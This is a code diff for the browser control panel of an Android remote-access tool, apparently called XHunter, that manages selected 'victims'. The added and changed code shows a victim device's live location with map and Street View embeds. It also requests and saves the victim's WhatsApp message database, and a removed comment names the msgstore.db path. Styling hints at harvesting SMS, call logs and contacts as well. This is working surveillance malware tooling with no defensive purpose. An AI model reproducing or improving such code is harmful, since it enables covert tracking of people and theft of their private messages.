-        locationOutput.innerHTML = `<h4>Location:</h4><p>Latitude: ${data.lat}, Longitude: ${data.long}</p><p><a href="https://www.google.com/maps/search/?api=1&query=${data.lat},${data.long}" target="_blank">View on Google Maps</a></p>`;
-        showToast('Location received.');
+        const lat = parseFloat(data.lat).toFixed(6);
+        const lng = parseFloat(data.long).toFixed(6);
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}`;
+        
+        let html = `
+            <h4>📍 Device Location</h4>
+            <div class="location-coords">
+                <p><strong>Latitude:</strong> ${lat}</p>
+                <p><strong>Longitude:</strong> ${lng}</p>
+            </div>
+            <div class="location-links">
+                <a href="${mapsUrl}" target="_blank" class="map-link">🗺️ Open in Google Maps</a>
+                <a href="${streetViewUrl}" target="_blank" class="street-link">👁️ Street View</a>
+            </div>
+            <div class="map-embed">
+                <iframe 
+                    width="100%" 
+                    height="250" 
+                    frameborder="0" 
+                    style="border:0; border-radius: 10px; margin-top: 15px;"
+                    src="https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed"
+                    allowfullscreen>
+                </iframe>
+            </div>
+        `;
+        
+        locationOutput.innerHTML = html;
+        showToast('📍 Location received', 'success');
     } else {
-        locationOutput.innerHTML = '<p>Could not retrieve location.</p>';
-        showToast('Location not received.');
+        locationOutput.innerHTML = `
+            <p>❌ Could not retrieve location.</p>
+            <p>Possible reasons:</p>
+            <ul>
+                <li>Location services are disabled</li>
+                <li>No GPS signal</li>
+                <li>Location permission not granted</li>
+            </ul>
+        `;
+        showToast('❌ Location not available', 'error');
     }
 });
 
-
-// WhatsApp Database Logic
+// ==================== WHATSAPP DATABASE ====================
 const downloadWhatsappDbBtn = document.getElementById('download-whatsapp-db-btn');
 
 downloadWhatsappDbBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    // Assuming the User APK knows the path or will retrieve it.
-    // The server expects `data` to be the path in the `downloadWhatsappDatabase` listener.
-    // For now, let's assume a default path that the User APK can interpret.
-    // If a specific path is needed, an input field would be required.
-    // For example, if the User APK expects data.path:
-    // socket.emit('downloadWhatsappDatabaseRequest', JSON.stringify({ to: selectedVictimId, action: 'downloadWhatsappDatabase', data: { path: '/data/data/com.whatsapp/databases/msgstore.db' } }));
-    // Based on Payload.java, it expects just the path string in `args[0].toString()`
-    // So, we need to provide a default or ask for user input.
-    // For now, let's send an empty data object, expecting Payload.java to handle default logic
-    socket.emit('downloadWhatsappDatabaseRequest', JSON.stringify({ to: selectedVictimId, action: 'downloadWhatsappDatabase', data: {} }));
-    showToast('Requesting WhatsApp database download...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'downloadWhatsappDatabase', 
+        data: {} 
+    };
+    
+    console.log('💬 Sending WhatsApp DB request:', requestData);
+    socket.emit('downloadWhatsappDatabaseRequest', JSON.stringify(requestData));
+    showToast('💬 Requesting WhatsApp database...');
 });
 
-// The server's 'downloadWhatsappDatabase' response is handled similarly to 'download' (chunked transfer).
-// So, we'll reuse the 'download' handler, but maybe add a specific toast for WhatsApp DB.
-// If the server emits a different event, we'd need a separate handler.
-// Assuming it will still trigger 'download' event on the client if it's the `downloadWhatsappDatabase` on server.
-// However, looking at server's `downloadWhatsappDatabase` socket.on, it `socket.broadcast.emit("downloadWhatsappDatabase", d, callback);`
-// So, we need a separate `socket.on` handler for `downloadWhatsappDatabase` on the client side.
-
 socket.on('downloadWhatsappDatabase', (data) => {
-    console.log('WhatsApp Database Download received:', data);
+    console.log('💬 WhatsApp Database:', data);
+    
     if (data.fileData && data.fileName) {
-        const link = document.createElement('a');
-        // Assuming it's a database file, use application/octet-stream
-        link.href = 'data:application/octet-stream;base64,' + btoa(String.fromCharCode.apply(null, new Uint8Array(data.fileData)));
-        link.download = data.fileName; // The original filename
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        showToast(`WhatsApp Database "${data.fileName}" downloaded.`);
+        try {
+            const byteCharacters = atob(data.fileData);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            
+            const blob = new Blob([byteArray], {type: 'application/octet-stream'});
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = data.fileName || 'whatsapp_database.db';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            showToast('✅ WhatsApp database downloaded', 'success');
+        } catch (error) {
+            console.error('WhatsApp DB error:', error);
+            showToast('❌ Failed to download WhatsApp DB', 'error');
+        }
     } else {
-        showToast('Failed to download WhatsApp database or no file data received.');
+        showToast('❌ No WhatsApp database found', 'error');
     }
+});
+
+// ==================== ADDITIONAL STYLES ====================
+const style = document.createElement('style');
+style.textContent = `
+    .file-info, .app-info, .contact-info, .sms-header, .call-header, .call-info {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 5px;
+        font-size: 0.9em;
+        color: #aaa;
+    }
+    
+    .size, .package, .phone, .sms-date, .call-duration {
+        font-family: monospace;
+    }
+    
+    .type {
+        background: rgba(0, 183, 255, 0.2);
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-size: 0.8em;
+    }
+    
+    .sms-body {
+        margin-top: 5px;
+        color: #ddd;
+        line-height: 1.4;
+    }
+    
+    .call-type-incoming {
+        border-left: 4px solid #00ff88;
+    }
+    
+    .call-type-outgoing {
+        border-left: 4px solid #00b7ff;
+    }
+    
+    .call-type-missed {
+        border-left: 4px solid #ff4444;
+    }
+    
+    .call-type-unknown {
+        border-left: 4px solid #ffaa00;
+    }
+    
+    .call-type, .call-number {
+        font-size: 0.9em;
+        color: #aaa;
+    }
+    
+    .location-coords {
+        background: rgba(0, 183, 255, 0.1);
+        padding: 15px;
+        border-radius: 10px;
+        margin: 15px 0;
+    }
+    
+    .location-links {
+        display: flex;
+        gap: 15px;
+        margin: 15px 0;
+    }
+    
+    .map-link, .street-link {
+        background: linear-gradient(135deg, #00b7ff, #0088ff);
+        color: white;
+        padding: 10px 20px;
+        border-radius: 8px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+    }
+    
+    .map-link:hover, .street-link:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(0, 183, 255, 0.4);
+    }
+    
+    .street-link {
+        background: linear-gradient(135deg, #ff8800, #ff5500);
+    }
+    
+    /* Debug console */
+    .debug-console {
+        position: fixed;
+        bottom: 10px;
+        right: 10px;
+        width: 300px;
+        height: 200px;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff88;
+        font-family: monospace;
+        font-size: 12px;
+        padding: 10px;
+        border-radius: 5px;
+        overflow-y: auto;
+        display: none;
+        z-index: 9999;
+    }
+    
+    .debug-console.show {
+        display: block;
+    }
+    
+    .debug-toggle {
+        position: fixed;
+        bottom: 220px;
+        right: 10px;
+        background: #333;
+        color: white;
+        padding: 5px 10px;
+        border-radius: 5px;
+        cursor: pointer;
+        z-index: 10000;
+    }
+`;
+document.head.appendChild(style);
+
+// Handle window close
+window.addEventListener('beforeunload', () => {
+    socket.disconnect();
+});
+
+// Auto scroll to bottom for outputs
+function autoScroll(elementId) {
+    const element = document.getElementById(elementId);
+    if (element) {
+        element.scrollTop = element.scrollHeight;
+    }
+}
+
+// Debug toggle
+const debugToggle = document.createElement('div');
+debugToggle.className = 'debug-toggle';
+debugToggle.textContent = '🔧 Debug';
+debugToggle.onclick = () => {
+    const debugConsole = document.querySelector('.debug-console');
+    if (debugConsole) {
+        debugConsole.classList.toggle('show');
+    }
+};
+document.body.appendChild(debugToggle);
+
+const debugConsole = document.createElement('div');
+debugConsole.className = 'debug-console';
+debugConsole.innerHTML = '<h4>Debug Console</h4>';
+document.body.appendChild(debugConsole);
+
+function debugLog(message) {
+    const debugConsole = document.querySelector('.debug-console');
+    if (debugConsole) {
+        const p = document.createElement('p');
+        p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        debugConsole.appendChild(p);
+        debugConsole.scrollTop = debugConsole.scrollHeight;
+    }
+}
+
+// Initialize
+console.log('🎮 XHunter Control Panel loaded');
+debugLog('Panel initialized');
+
+// Keyboard shortcuts
+document.addEventListener('keydown', (e) => {
+    // Ctrl+D for debug console
+    if (e.ctrlKey && e.key === 'd') {
+        e.preventDefault();
+        const debugConsole = document.querySelector('.debug-console');
+        if (debugConsole) {
+            debugConsole.classList.toggle('show');
+        }
+    }
+    
+    // Ctrl+R to refresh victims
+    if (e.ctrlKey && e.key === 'r') {
+        e.preventDefault();
+        if (selectedVictimId) {
+            const selectedBtn = document.querySelector(`#victim-${selectedVictimId} .select-victim-btn`);
+            if (selectedBtn) {
+                selectedBtn.click();
+            }
+        }
+    }
+});
+
+// Periodic connection check
+setInterval(() => {
+    if (socket.connected) {
+        socket.emit('ping', { timestamp: Date.now() });
+    }
+}, 30000);
+
+socket.on('pong', (data) => {
+    debugLog(`Pong received: ${new Date(data.timestamp).toLocaleTimeString()}`);
 });
